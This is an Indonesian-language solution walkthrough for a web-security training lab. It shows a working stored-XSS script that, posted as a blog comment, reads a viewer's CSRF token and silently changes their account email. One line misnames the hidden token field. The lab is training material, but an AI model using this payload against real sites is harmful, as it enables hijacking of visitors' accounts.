# Exploiting XSS to bypass CSRF defenses

Lab ini berisi kerentanan **Stored XSS** pada fitur komentar blog. Untuk menyelesaikan lab ini, kamu harus mengeksploitasi kerentanan tersebut untuk **mencuri CSRF token**, yang kemudian bisa kamu gunakan untuk mengubah alamat email milik seseorang yang melihat komentar pada postingan blog.

Kamu bisa login ke akun kamu sendiri menggunakan kredensial berikut: `wiener:peter`


**Petunjuk :**

Anda tidak dapat mendaftarkan alamat email yang sudah digunakan oleh pengguna lain. Jika Anda mengubah alamat email Anda sendiri saat menguji eksploitasi, gunakan alamat email yang berbeda untuk eksploitasi akhir yang Anda kirimkan ke korban.


## Solusi

1. Masuk menggunakan kredensial yang diberikan. Di halaman akun pengguna kamu, perhatikan fitur untuk memperbarui alamat email.

2. Jika kamu melihat source code halaman tersebut, akan terlihat informasi berikut:

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
<label>Email</label>
<input required="" type="email" name="email" value="">
<input required="" type="hidden" name="csrf" value="TgMz91z2qn8NYbYkM5gTQ0se4zbVbjSH">
<button class="button" type="submit"> Update email </button>
</form>
```

   * Kamu harus mengirim request **POST** ke `/my-account/change-email` dengan parameter bernama `email`.
   * Ada **anti-CSRF token** pada input tersembunyi bernama `token`.

Artinya, eksploitasi yang kamu lakukan harus:

   * memuat halaman akun pengguna,
   * mengekstrak CSRF token,
   * lalu menggunakan token itu untuk mengubah email korban.

3. Kirim payload berikut di komentar blog:

```html 
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];

    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    changeReq.send('csrf=' + token + '&email=test@test.com');
};
</script>
```

4. Script ini akan membuat siapa pun yang melihat komentar tersebut:

   * membuka halaman `/my-account`
   * mengambil CSRF token
   * lalu mengirim request untuk mengubah email mereka menjadi `test@test.com`
